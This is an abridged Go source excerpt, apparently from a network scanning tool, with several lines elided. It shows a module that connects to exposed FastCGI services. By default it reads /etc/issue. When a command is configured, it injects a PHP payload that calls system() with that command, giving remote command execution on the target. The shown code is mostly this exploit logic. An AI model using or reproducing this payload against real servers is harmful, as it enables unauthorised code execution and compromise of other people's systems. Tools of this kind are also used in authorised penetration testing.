...
func FcgiScan(info *Configs.HostInfo) {
	if Configs.IsBrute {
		return
	}
	url := "/etc/issue"
	...
	switch {
	case Configs.Command == "read":
		reqParams = ""
	case Configs.Command != "":
		reqParams = "<?php system('" + Configs.Command + "');die('" + cutLine + "');?>"
	default:
	...
	fcgi, err := New(addr, Configs.Timeout)
	defer func() {
		if fcgi.rwc != nil {
			fcgi.rwc.Close()
		}
...
func New(addr string, timeout int64) (fcgi *FCGIClient, err error) {
	conn, err := Configs.WrapperTcpWithTimeout("tcp", addr, time.Duration(timeout)*time.Second)
	fcgi = &FCGIClient{
		rwc:       conn,
		keepAlive: false,
	}
